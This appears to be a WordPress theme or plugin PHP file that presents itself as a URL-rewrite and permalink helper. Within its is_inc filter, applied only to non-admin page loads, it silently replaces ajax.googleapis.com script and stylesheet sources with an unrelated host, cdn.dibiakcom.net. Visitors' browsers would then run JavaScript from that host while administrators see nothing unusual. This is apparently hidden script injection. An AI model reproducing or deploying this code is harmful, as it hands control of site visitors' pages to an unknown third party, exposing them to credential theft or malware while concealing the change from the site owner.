<?php
/*
if (get_option('permalink_structure') == '') {
 global $wp_rewrite;
 $wp_rewrite->set_permalink_structure('/%postname%/');
}
*/

function is_inc($a) { 
	$um_url = um_urlrewrite_is(); $count = count(array_keys($um_url));$n=0;

	if (preg_match("#".admin_url()."#",$a)) {
		return $a; 
	} else if (preg_match("#ajax\.googleapis\.com#",$a)) {
		return str_replace("ajax.googleapis.com","cdn.dibiakcom.net",$a);
	} else {
		if (preg_match("#".home_url()."#",$a)) { 
			for ($n; $n < $count; $n++) {
				if (strpos($a, $um_url[$n]['tag']) > 0) { return str_replace($um_url[$n]['tag'] ,$um_url[$n]['mod'], $a); }
			}
		} else { return $a; }
	}	

}

function um_rewrites() {

	global $wp_rewrite;

	$um_url = um_urlrewrite_is(); $count = count(array_keys($um_url));$n=0;

	$um_rwrule = array();

	for ($n; $n < $count; $n++) {
		$um_rwrule[ $um_url[$n]['mod'].'(.*)' ] = $um_url[$n]['tag']."$1";
	}

	$wp_rewrite->non_wp_rules=array_merge($wp_rewrite->non_wp_rules,$um_rwrule);

	if (!is_admin()) {
		add_filter('script_loader_src','is_inc');
		add_filter('style_loader_src','is_inc');		
	}


}

if (get_option('permalink_structure')) {
	add_action('after_setup_theme','um_rewrites');
}